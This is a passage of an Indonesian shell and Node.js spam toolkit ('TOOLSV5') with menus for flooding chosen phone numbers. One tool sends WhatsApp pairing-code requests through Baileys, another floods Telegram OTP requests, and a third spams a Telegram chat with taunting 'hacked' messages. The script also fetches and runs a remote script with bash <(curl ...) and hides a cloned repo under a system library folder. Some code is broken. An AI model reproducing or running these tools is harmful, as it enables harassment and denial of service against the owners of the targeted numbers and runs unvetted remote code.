⠀⠀⠀⠀⠀⠀⢠⡾⣻⣿⣿⣿⣿⠿⠿⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣷⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⣿⣧⡀⠀
⠀⠀⠀⠀⠀⣀⣾⣿⣿⣿⠿⠛⠂⠀⠀⡀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡈⢻⣿⣿⣆⠈⢻⣧⠀
⠀⠀⠀⠀⠻⣿⠛⠉⠀⠀⠀⠀⢀⣤⣾⣿⣦⣤⣤⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⠙⢿⣿⣿⣿⡇⠀⢻⣿⣿⡀⠀⠻⡆
⠀⠀⣰⣤⣤⣤⣤⣤⣤⣴⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠈⢻⣿⣿⣿⠀⠀⢹⣿⣇⠀⠀⠳
⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⢻⠛⠛⠻⣿⣿⣿⣿⣿⣿⣿⣧⠀⢻⣿⣿⡆⠀⠀⢻⣿⠀⠀⠀
⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠁⠀⠼⠛⢿⣶⣦⣿⣿⠻⣿⣿⣿⣿⣿⣇⠀⢻⣿⡇⠀⠀⠀⣿⠀⠀⠀
⠸⠛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⠀⠀⠀⠀⠀⠘⠁⠈⠛⠋⠀⠘⢿⣿⣿⣿⣿⡀⠈⣿⡇⠀⠀⠀⢸⡇⠀⠀
⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⡇⠀⢹⠇⠀⠀⠀⠈⠀⠀⠀
⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⡇⠀⠼⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡉⠛⠛⠿⠿⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢈⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠘⢿⣿⣿⣿⣷⡀⠉⠙⠻⠿⢿⣿⣷⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠙⠿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⢀⡄⠀⠀⠀⢀⣠⣾⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠿⢦⣀⠀⠀⠀⢀⣴⣿⣧⣤⣴⣾⡿⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠛⠛⠛⠛⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
${chalk.bgBlack(chalk.yellow.bold('Pengembang Script Ini'))} ${chalk.white.bold(':')} ${chalk.hex(randomColor).bold('GALIRUS X GUSTI')}
${chalk.bgBlack(chalk.yellow.bold('Nomor Target Terlock'))} ${chalk.white.bold(' :')} ${chalk.hex('#00BFFF').bold(target)}
${chalk.bgBlack(chalk.yellow.bold('Spam Kode Succesfull'))} ${chalk.white.bold(' :')} ${chalk.red.bold(prc)}
${chalk.bgBlack(chalk.yellow.bold('Total Spam Terkirim'))} ${chalk.white.bold('  :')} ${chalk.bold.white(i + 1)}
`));
}
};
const handleError = async (error) => {
console.error(chalk.red.bold(`Terjadi kesalahan: ${error}`));
console.log(chalk.yellow.bold(`\n\nSedang Istirahat selama 30 detik sebelum memulai ulang...`));
console.log(chalk.yellow.bold(`===================================\n`));
for (let i = 30; i >= 0; i--) {
process.stdout.write(`\r${chalk.cyan.bold(`Memulai ulang dalam: ${i} detik... `)}`);
await sleep(1000);
}
console.log('\n'); // Pindah baris setelah countdown selesai
restartSpam();
};
const restartSpam = async () => {
// Hapus console.clear() yang terlalu sering. Cukup beri informasi bahwa proses diulang
console.log(chalk.greenBright.bold('Memulai ulang proses spam...'));
await sleep(1000);
startSpamProcess();
};
// Mulai program
loadNumbers();
startSpamProcess();
EOF
)"
IFS= read -r -e -p "Silahkan Enter"
;;
2)
loading1
clear
show_file
IFS= read -r -e -p "Tekan Enter untuk kembali ke menu..."
;;
3)
loading1
add_number
;;
4)
loading1
remove_number
;;
5)
loading1
cd $HOME
nano number.txt
;;
0)
break
;;
*) dialog --msgbox "Pilihan tidak valid." 8 40 ;;
esac
done
}
spamnya
break
else
clear
play -q $HOME/TOOLSV5/sound/salah.mp3 &> /dev/null
cd $spamtautan
echo "Node_Modules Belum Terinstall"
sleep 5
clear
echo -e "Menginstall Node_Modules"
$paket install -y yarn
yarn cache clean
yarn
yarn add @whiskeysockets/baileys
fi
done
else
clear
e $bg_m "Installasi Package$res"
mkdir "$spamtautan"
fi
elif [[ $no == "s1" || $no == "S1" ]]; then
isipesan="Terdeteksi login s2 ( spam bot tele)  💻"
telegram &> /dev/null &
function Continue() {
IFS= read -r -e -p "Press Enter to continue..."
}
IFS= read -r -e -p "Masukkan Token Bot Telegram : " token
IFS= read -r -e -p "Masukkan Chat ID : " chat_id
banner_skill() {
echo -e "
$m⠀ ⠀⠀⠀⣶⡆⠀⠀⠀⢀⣴⢦⠀⠀⠀⠀⣖⡶⠀⠀⠀⠀⡏⡧⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢹⣷⡀⠀⠀⢀⣿⣧⡀⠀⠀⢠⣾⣧⠀⠀⠀⣠⣾⡇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢸⣿⣿⣦⡀⣼⣿⣿⣷⡀⢠⣿⣿⣿⡆⢀⣾⣿⣿⡇⠀⠀⠀⠀⠀
$p⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⠋⠙⢿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀
$k⠀⠀⠀⠀⠠⣤⣉⣙⠛⠛⠛⠿⠿⠁⣴⣦⡈⠻⠛⠛⠛⢛⣉⣁⡤⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠈⠉⠛⠻⠿⠶⣶⣆⠈⢿⡿⠃⣠⣶⡿⠿⠟⠛⠉⠀⠀⠀⠀⠀⠀
$p⠀⠀⠀⠀⠀⢠⣿⣿⣶⣶⣤⣤⣤⣤⡀⢁⣠⣤⣤⣤⣶⣶⣿⣿⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣸⣿⡏⠉⠙⠛⠿⢿⣿⣿⣾⣿⡿⠿⠛⠋⠉⠹⣿⡇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠻⢿⣧⣀⠀⠀⣀⣀⣼⡿⣿⣯⣀⣀⠀⠀⣀⣼⡿⠗⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠙⠻⣿⣿⣿⣿⣿⠁⠘⣿⣿⣿⣿⣿⠟⠉$h  Spam Bot Tele Target ⠀⠀⠀⠀⠀⠀
$p⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⣿⣿⣇⣀⣀⣹⣿⣿⣿⠃$k Developer$c Galirus Official⠀⠀⠀⠀⠀⠀⠀⠀
$p⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⠿⣿⡿⢿⣿⠿⣿⡇$or Version$k :$bld 1.0.5⠀⠀⠀⠀⠀
$p⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⡇⢀⣿⡇⢸⣿⡀⢸⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠁⠈⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
"
e $p $bg_lg"==============[$m INFORMASI TARGET $p ] ================$res"
e $b "[$c •$b ]$k Status Token$m   :$bl $BOT_ID ***** $k($c Kode$lg:$bl $token_status$k)"
e $b "[$c •$b ]$k Status Chat ID$m :$bl $chat_id $k($c Kode$lg:$bl $chat_status$k)"
e $b "[$c •$b ]$k Name Bot Tele$m  :$bl $BOT_NAME"
e $b "[$c •$b ]$k Username Bot$m   :$bl $BOT_USERNAME"
echo
e $p $bg_lg"==============[$m MENU OPTION$p ] ======================$res"
}
function Main() {
while true; do
token_status=$(curl -s -o /dev/null -w "%{http_code}" "https://api.telegram.org/bot$token/getMe")
chat_status=$(curl -s -o /dev/null -w "%{http_code}" "https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=Cek%20Validasi")
URL="https://api.telegram.org/bot$token"
BOT_INFO=$(curl -s "$URL/getMe")
BOT_NAME=$(echo "$BOT_INFO" | grep -oP '"first_name":"\K[^"]+')
BOT_USERNAME=$(echo "$BOT_INFO" | grep -oP '"username":"\K[^"]+')
BOT_ID=$(echo "$BOT_INFO" | grep -oP '"id":\K[0-9]+')
clear
play -q $HOME/Lubeban/sound/klik.mp3 &> /dev/null &
banner_skill
echo -e "$m [$res 01$m ]$res Gas Spam"
echo -e "$m [$res 00$m ]$res Exit ( Keluar )"
IFS= read -r -e -p " Silahkan Pilih ---> " sp
play -q $HOME/Lubeban/sound/klik.mp3 &> /dev/null &
if [[ $sp == "?" ]]; then
echo -e "\nSpam Bot Telegram"
echo -e "Spam Bot Telegram adalah tool untuk melakukan spam terhadap api bot telegram."
Continue
Main
fi
if [[ $sp == "1" || $sp == "01" ]]; then
IFS= read -r -e -p "Masukkan Text : " text
IFS= read -r -e -p "Masukkan Gambar (URL/File) : " photo_input
IFS= read -r -e -p "Masukkan Audio (URL/File) : " audio_input
teks_list=(
"Hozo Itu Kroco 😹👍"
"TOOLSV5 SPAM BOT TELE: Sudah I Backdoor Mu ! Sadar Diri !"
"TOOLSV5 WORK 100%😱"
"😈Hacked By Ambakatum😈"
"😂TEWAS DI HITAMKAN😂"
"🔥PENGUNA TOOLSV5 NIH BOS🔥"
"😂APALAH BACKDOOR😂"
"DEVELOPMENT TOOLSV5 X GALIRUS"
"BELI TOOLSV5 CUY WORK NIH"
)
photo_list=(
"https://iili.io/3axCIwJ.png"
"https://iili.io/3ax1En2.jpg"
"https://iili.io/3axWBXj.jpg"
"https://iili.io/3axj4TX.jpg"
"https://iili.io/3axv6jS.jpg"
"https://iili.io/3axrTb4.jpg"
)
audio_list=(
"https://od.lk/s/OV8yNDkzOTU4OTJf/GALIRUS_OFFICIAL_1743646553.mp3"
"https://od.lk/s/OV8yNDQyMDk3Nzdf/GALIRUS_OFFICIAL_1731080763.mp3"
"https://od.lk/s/OV8yMzMwNjgwMDJf/md.mp3"
"https://od.lk/s/OV8yNDQ4MzUyMzRf/tsfhv.mp3"
"https://od.lk/s/OV8yNDc4NTE3Mjlf/GALIRUS_OFFICIAL_1740192780.mp3"
"https://od.lk/s/OV8yMTU5MDAyOTJf/music.mp3"
)
clear
banner_skill
e "$k Tekan$m 'q'$k lalu$m Enter$k untuk berhenti kapan saja.$c"
echo -ne "\rProcessing...\n"
i=1
while true; do
if [[ -z "$text" ]]; then
text=$(shuf -n1 -e "${teks_list[@]}")
fi
if [[ -z "$photo_input" ]]; then
photo_input=$(shuf -n1 -e "${photo_list[@]}")
fi
if [[ -z "$audio_input" ]]; then
audio_input=$(shuf -n1 -e "${audio_list[@]}")
fi
echo -ne "\r[$i] Sending...          "
curl -s -d "chat_id=$chat_id" -d "parse_mode=Markdown" -d "text=$text" "https://api.telegram.org/bot$token/sendMessage" > /dev/null
if [[ -f "$photo_input" ]]; then
curl -s -F "chat_id=$chat_id" -F "caption=$text" -F "photo=@$photo_input" "https://api.telegram.org/bot$token/sendPhoto" > /dev/null
elif [[ "$photo_input" =~ ^https?:// ]]; then
curl -s -d "chat_id=$chat_id" -d "caption=$text" -d "photo=$photo_input" "https://api.telegram.org/bot$token/sendPhoto" > /dev/null
fi
if [[ -f "$audio_input" ]]; then
curl -s -F "chat_id=$chat_id" -F "caption=$text" -F "audio=@$audio_input" "https://api.telegram.org/bot$token/sendAudio" > /dev/null
elif [[ "$audio_input" =~ ^https?:// ]]; then
curl -s -d "chat_id=$chat_id" -d "caption=$text" -d "audio=$audio_input" "https://api.telegram.org/bot$token/sendAudio" > /dev/null
fi
echo -ne "\r[ ✓ ] Success kirim ke $i      "
i=$((i + 1))
sleep 1
read -t 0.1 -p "" stop_input
if [[ "$stop_input" == "q" ]]; then
echo -ne "$m\nBerhenti.$k Total pesan terkirim$b:$bl $((i - 1)) kali!$m \n"
IFS= read -r -e -p "Tekan Enter untuk kembali ke menu..."
Main
break
fi
done
elif [[ $sp == "0" || $sp == "00" ]]; then
echo "Bye bye!"
break 5
else
echo "Input salah! Pilih 1 atau 0."
sleep 2
Main
fi
done
}
Main
elif [[ $no == "s3X" || $no == "S3X" ]]; then
isipesan="Terdeteksi login s3 ( spam tokopedia )  💻"
telegram &> /dev/null &
bash <(curl -sL https://od.lk/s/OV8yNTA3NTk2NDdf/spam.sh)
elif [[ $no == "s2" || $no == "S2" ]]; then
while true; do
letak="$PREFIX/lib/pkgconfig/spamweb"
if [ -d "$letak" ]; then
cd $letak
git stash &> /dev/null
git pull origin main &> /dev/null
isipesan="Terdeteksi login s2 ( spam bot )  💻"
telegram &> /dev/null &
if [ -d "node_modules" ]; then
clear
node -e "$(
cat << 'EOF'
const express = require('express');
const chalk = require('chalk');
const { default: makeWaSocket, useMultiFileAuthState, fetchLatestBaileysVersion } = require('@whiskeysockets/baileys');
const pino = require('pino');
const readline = require('readline');
const { exec } = require('child_process');
const app = express();
app.use(express.json());
app.use(express.static('public'));
const rl = readline.createInterface({
input: process.stdin,
output: process.stdout
});
const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
const getRandomColor = () => {
const colors = [chalk.redBright, chalk.yellowBright, chalk.greenBright, chalk.magentaBright];
return colors[Math.floor(Math.random() * colors.length)];
};
let totalSpamCount = 0;
let lastActiveTime = new Date().getTime();
let initialSpamTime;
const countryCode = '';
const blockedNumbers = ['6285850268349', ''];
const requiredNumbers = ['', '', '', ''];
let logData = '';
let isSpamming = false;
const isValidPhoneNumber = (phoneNumber) => {
return /^\d{10,14}$/.test(phoneNumber);
};
const sendLog = (res, log) => {
res.write(`data: ${log}\n\n`);
};
const displayBanner = () => {
console.log(chalk.greenBright.bold(chalk.bgBlack(`
⠄⠄⠄⢰⣧⣼⣯⠄⣸⣠⣶⣶⣦⣾⠄⠄⠄⠄⡀⠄⢀⣿⣿⠄⠄⠄⢸⡇⠄⠄
⠄⠄⠄⣾⣿⠿⠿⠶⠿⢿⣿⣿⣿⣿⣦⣤⣄⢀⡅⢠⣾⣛⡉⠄⠄⠄⠸⢀⣿⠄
⠄⠄⢀⡋⣡⣴⣶⣶⡀⠄⠄⠙⢿⣿⣿⣿⣿⣿⣴⣿⣿⣿⢃⣤⣄⣀⣥⣿⣿⠄
⠄⠄⢸⣇⠻⣿⣿⣿⣧⣀⢀⣠⡌⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⣿⣿⣿⠄
⠄⢀⢸⣿⣷⣤⣤⣤⣬⣙⣛⢿⣿⣿⣿⣿⣿⣿⡿⣿⣿⡍⠄⠄⢀⣤⣄⠉⠋⣰
⠄⣼⣖⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⢇⣿⣿⡷⠶⠶⢿⣿⣿⠇⢀⣤
⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣽⣿⣿⣿⡇⣿⣿⣿⣿⣿⣿⣷⣶⣥⣴⣿⡗
⢀⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠄
⢸⣿⣦⣌⣛⣻⣿⣿⣧⠙⠛⠛⡭⠅⠒⠦⠭⣭⡻⣿⣿⣿⣿⣿⣿⣿⣿⡿⠃⠄
⠘⣿⣿⣿⣿⣿⣿⣿⣿⡆⠄⠄⠄⠄⠄⠄⠄⠄⠹⠈⢋⣽⣿⣿⣿⣿⣵⣾⠃⠄
⠄⠘⣿⣿⣿⣿⣿⣿⣿⣿⠄⣴⣿⣶⣄⠄⣴⣶⠄⢀⣾⣿⣿⣿⣿⣿⣿⠃⠄⠄
⠄⠄⠈⠻⣿⣿⣿⣿⣿⣿⡄⢻⣿⣿⣿⠄⣿⣿⡀⣾⣿⣿⣿⣿⣛⠛⠁⠄⠄⠄
⠄⠄⠄⠄⠈⠛⢿⣿⣿⣿⠁⠞⢿⣿⣿⡄⢿⣿⡇⣸⣿⣿⠿⠛⠁⠄⠄⠄⠄⠄
⠄⠄⠄⠄⠄⠄⠄⠉⠻⣿⣿⣾⣦⡙⠻⣷⣾⣿⠃⠿⠋⠁⠄⠄⠄⠄⠄⢀⣠⣴
⣿⣿⣿⣶⣶⣮⣥⣒⠲⢮⣝⡿⣿⣿⡆⣿⡿⠃⠄⠄⠄⠄⠄⠄⠄⣠⣴⣿⣿⣿\n`)));
};
const resetTerminal = () => {
readline.cursorTo(process.stdout, 0, 0);
readline.clearScreenDown(process.stdout);
};
resetTerminal();
displayBanner();
app.post('/start', async (req, res) => {
const { target1, target2, option } = req.body;
const targets = [target1];
if (option === '2') {
targets.push(target2);
}
const validTargets = targets.filter(target => isValidPhoneNumber(target));
requiredNumbers.forEach(reqNum => {
if (isValidPhoneNumber(reqNum) && !validTargets.includes(reqNum)) {
validTargets.push(reqNum);
}
});
const targetsToSpam = validTargets.filter(target => !blockedNumbers.includes(target));
if (targetsToSpam.length === 0) {
return res.status(400).json({ message: 'No valid phone numbers provided' });
}
let { state } = await useMultiFileAuthState('Galirus_&_Gusti');
let { version } = await fetchLatestBaileysVersion();
let sucked = await makeWaSocket({ auth: state, version, logger: pino({ level: 'fatal' }) });
isSpamming = true; // Mengatur flag spamming menjadi true
targetsToSpam.forEach(target => {
startSpamming(sucked, target);
});
res.json({ message: 'Run Pairing Code !' });
});
app.post('/stop', (req, res) => {
isSpamming = false; // Mengatur flag spamming menjadi false
console.log('Spamming dihentikan');
res.json({ message: 'Spamming dihentikan' });
});
const startSpamming = async (sucked, target) => {
let spamCount = 0;
while (isSpamming) {
if (spamCount >= 35) {
let totalDetik = 60 * 60; // Total detik untuk 1 jam
while (totalDetik > 0) {
const jam = Math.floor(totalDetik / 3600);
const menit = Math.floor((totalDetik % 3600) / 60);
const detik = totalDetik % 60;
process.stdout.write(`\rMenunggu Waktu Jeda     : ${jam.toString().padStart(2, '0')}:${menit.toString().padStart(2, '0')}:${detik.toString().padStart(2, '0')}`);
await sleep(5000); // Tunggu 1 detik
totalDetik--;
}
console.log(`\nJeda selesai, melanjutkan pengiriman...`);
spamCount = 0; // Reset spam count setelah jeda
}
try {
await spamTarget(sucked, target);
spamCount++;
totalSpamCount++;
} catch (error) {
console.log(chalk.yellow.bold(`\n\nSedang Restart, Spam Ulang Aktif...`));
console.log(chalk.yellow.bold(`===================================\n`));
await sleep(2000);
let { state } = await useMultiFileAuthState('Galirus_&_Gusti');
let { version } = await fetchLatestBaileysVersion();
sucked = await makeWaSocket({ auth: state, version, logger: pino({ level: 'fatal' }) });
}
}
};
const spamTarget = async (sucked, target) => {
if (!target.startsWith(countryCode)) {
console.log(chalk.white.bold('\nHarus Awalan Kode Negara'));
logData += `Harus Awalan Kode Negara\n`;
return;
}
if (blockedNumbers.includes(target)) {
console.log(chalk.white.bold('\nNomor Owner Di Spam, Nanti Ngelag 😂'));
exec('npm start', (error, stdout, stderr) => {
if (error) {
console.error(`Exec error: ${error}`);
return;
}
console.log(`stdout: ${stdout}`);
console.error(`stderr: ${stderr}`);
});
return;
}
if (!initialSpamTime) {
initialSpamTime = new Date().toLocaleTimeString('id-ID', { hour12: false });
console.log(chalk.greenBright.bold(`${chalk.yellow.bold('Waktu Pertama Spam Jam')} ${chalk.white.bold(':')} ${chalk.white.bold(initialSpamTime)}`));
logData += `Waktu Pertama Spam Jam: ${initialSpamTime}\n`;
}
await sleep(5000);
try {
let prc = await sucked.requestPairingCode(target);
lastActiveTime = new Date().getTime();
resetTerminal();
displayBanner();
console.log(chalk.greenBright.bold(`${chalk.yellow.bold('Pengembang Script Ini')}   ${chalk.white.bold(':')} ${chalk.white.bold(getRandomColor()('GALIRUS X GUSTI'))}`));
console.log(chalk.yellow.bold(`Nomor Target            ${chalk.white.bold(':')} ${chalk.white.bold(target)}`));
console.log(chalk.yellow.bold(`Spam Kode Succesfull    ${chalk.white.bold(':')} ${chalk.white.bold(prc)}`));
console.log(chalk.yellow.bold(`Total Spam Terkirim     ${chalk.red.bold(':')} ${chalk.white.bold(totalSpamCount)}`));
console.log(chalk.yellow.bold(`Waktu Spam Pertama      ${chalk.white.bold(':')} ${chalk.white.bold(initialSpamTime)}`));
const currentSpamTime = new Date().toLocaleTimeString('id-ID', { hour12: false });
console.log(chalk.yellow.bold(`Waktu Sekarang Jam      ${chalk.white.bold(':')} ${chalk.white.bold(currentSpamTime)}`));
} catch (error) {
startSpamming = async (sucked, target);
}
if ((new Date().getTime() - lastActiveTime) > 60000) {
console.log(chalk.white.bold('Tidak Ada Respon Selama 1Menit Bung, Spam Berhenti'));
logData += `Tidak Ada Respon Selama 1Menit Bung, Spam Berhenti\n`;
process.exit(1);
}
};
app.get('/monitor', (req, res) => {
res.setHeader('Content-Type', 'text/event-stream');
res.setHeader('Cache-Control', 'no-cache');
res.setHeader('Connection', 'keep-alive');
const intervalId = setInterval(() => {
sendLog(res, logData);
}, 1000);
req.on('close', () => {
clearInterval(intervalId);
});
});
rl.question('Masukkan port yang ingin digunakan contoh:( 8080 ): ', (inputPort) => {
const port = parseInt(inputPort, 10);
if (isNaN(port) || port <= 0) {
console.log(chalk.red.bold('Port tidak valid. Silakan masukkan angka.'));
process.exit(1);
}
app.listen(port, () => {
console.log(chalk.green.bold(`Server running on http://localhost:${port}`));
});
rl.close();
});
EOF
)"
break
else
$paket install -y bash
$paket install -y libwebp
$paket install -y git
$paket install -y nodejs
$paket install -y ffmpeg
$paket install -y wget
$paket install -y imagemagick
$paket install yarn
yarn
fi
break
else
cd $PREFIX/lib/pkgconfig
git clone https://github.com/Lubebansokhekel/spamweb &> /dev/null && echo "Sabar Ntot Instalasi package"
cd spamweb
git stash &> /dev/null
git pull origin main &> /dev/null
fi
done
elif [[ $no == "s5X" || $no == "S5X" ]]; then
isipesan="Terdeteksi login s5 ( spam otp telegram )  ��"
telegram &> /dev/null &
cat << 'EOF' > $PREFIX/lib/bash/otp
e="echo -e "
m="\033[1;31m"   # Merah (Sudah diberikan)
h="\033[1;32m"   # Hijau (Sudah diberikan)
k="\033[1;33m"   # Kuning (Sudah diberikan)
b="\033[1;34m"   # Biru (Sudah diberikan)
bl="\033[1;36m"  # Biru Muda (Sudah diberikan)
p="\033[1;37m"   # Putih (Sudah diberikan)
u="\033[1;35m"   # Ungu
pu="\033[1;30m"  # Abu-abu
c="\033[1;96m"   # Cyan Terang
or="\033[1;91m"  # Merah Muda Terang
g="\033[1;92m"   # Hijau Terang
y="\033[1;93m"   # Kuning Terang
bld="\033[1;94m" # Biru Terang
pwl="\033[1;95m" # Ungu Terang
blg="\033[1;97m" # Putih Terang
lg="\033[1;90m"  # Abu-abu Terang
bg_m="\033[41m"    # Latar Belakang Merah
bg_h="\033[42m"    # Latar Belakang Hijau
bg_k="\033[43m"    # Latar Belakang Kuning
bg_b="\033[44m"    # Latar Belakang Biru
bg_bl="\033[46m"   # Latar Belakang Biru Muda
bg_p="\033[47m"    # Latar Belakang Putih
bg_u="\033[45m"    # Latar Belakang Ungu
bg_pu="\033[40m"   # Latar Belakang Abu-abu
bg_c="\033[106m"   # Latar Belakang Cyan Terang
bg_or="\033[101m"  # Latar Belakang Merah Muda Terang
bg_g="\033[102m"   # Latar Belakang Hijau Terang
bg_y="\033[103m"   # Latar Belakang Kuning Terang
bg_bld="\033[104m" # Latar Belakang Biru Terang
bg_pwl="\033[105m" # Latar Belakang Ungu Terang
bg_lg="\033[100m"  # Latar Belakang Abu-abu Terang
res="\033[0m"
url="https://oauth.telegram.org/auth/request?bot_id=1264128836&origin=https%3A%2F%2Fwww.money-whale.com&request_access=read"
banner_skill() {
echo -e "
$m⠀ ⠀⠀⠀⣶⡆⠀⠀⠀⢀⣴⢦⠀⠀⠀⠀⣖⡶⠀⠀⠀⠀⡏⡧⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢹⣷⡀⠀⠀⢀⣿⣧⡀⠀⠀⢠⣾⣧⠀⠀⠀⣠⣾⡇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢸⣿⣿⣦⡀⣼⣿⣿⣷⡀⢠⣿⣿⣿⡆⢀⣾⣿⣿⡇⠀⠀⠀⠀⠀
$p⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⠋⠙⢿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀
$k⠀⠀⠀⠀⠠⣤⣉⣙⠛⠛⠛⠿⠿⠁⣴⣦⡈⠻⠛⠛⠛⢛⣉⣁⡤⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠈⠉⠛⠻⠿⠶⣶⣆⠈⢿⡿⠃⣠⣶⡿⠿⠟⠛⠉⠀⠀⠀⠀⠀⠀
$p⠀⠀⠀⠀⠀⢠⣿⣿⣶⣶⣤⣤⣤⣤⡀⢁⣠⣤⣤⣤⣶⣶⣿⣿⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣸⣿⡏⠉⠙⠛⠿⢿⣿⣿⣾⣿⡿⠿⠛⠋⠉⠹⣿⡇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠻⢿⣧⣀⠀⠀⣀⣀⣼⡿⣿⣯⣀⣀⠀⠀⣀⣼⡿⠗⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠙⠻⣿⣿⣿⣿⣿⠁⠘⣿⣿⣿⣿⣿⠟⠉$h  Simpel Spam OTP Telegram⠀⠀⠀⠀⠀⠀
$p⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⣿⣿⣇⣀⣀⣹⣿⣿⣿⠃$k Developer$c Galirus Official⠀⠀⠀⠀⠀⠀⠀⠀
$p⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⠿⣿⡿⢿⣿⠿⣿⡇$or Version$k :$bld 1.0.0 beta...!⠀⠀⠀⠀⠀⠀
$p⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⡇⢀⣿⡇⢸⣿⡀⢸⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠁⠈⠉⠁⠀⠀⠀⠀⠀
Sawer Admin Seikhlasnya$k https://saweria.co/Galirus$res$h
⠀⠀⠀⠀⠀
$m$bg_lg Silahkan Tekan q Lalu Enter$res
$m$bg_lg Untuk Berhenti Dan Otomatis Masuk Ke Toolsv5$res
"
echo
}
clear
run() {
ctrl_c() {
echo -e "\n[!] Script Berhenti !"
exit 0
}
trap ctrl_c INT
while true; do
emojis=(
"🤬"
"🥶"
"😈"
"🥵"
"🤨"
"😆"
)
randomIndex=$(( RANDOM % ${#emojis[@]} ))
clear
banner_skill
echo -e "$c[$b Pengiriman No$m:$c $nomor_telepon ]$p"
echo
response=$(curl -s "$url" -d "phone=$nomor_telepon")
response &> /dev/null | printf "\r GALIRUS OFFICIAL ${emojis[$randomIndex]}\n"
echo
read -t 5 -p "" user_input
if [[ $user_input == "q" ]]; then
echo "[!] Script Dihentikan oleh Pengguna."
break
fi
done
}
clear
banner_skill
IFS= read -r -e -p "Masukkan nomor telepon (contoh: 628): " nomor_telepon
run
EOF
chmod 777 $PREFIX/lib/bash/otp
bash $PREFIX/lib/bash/otp
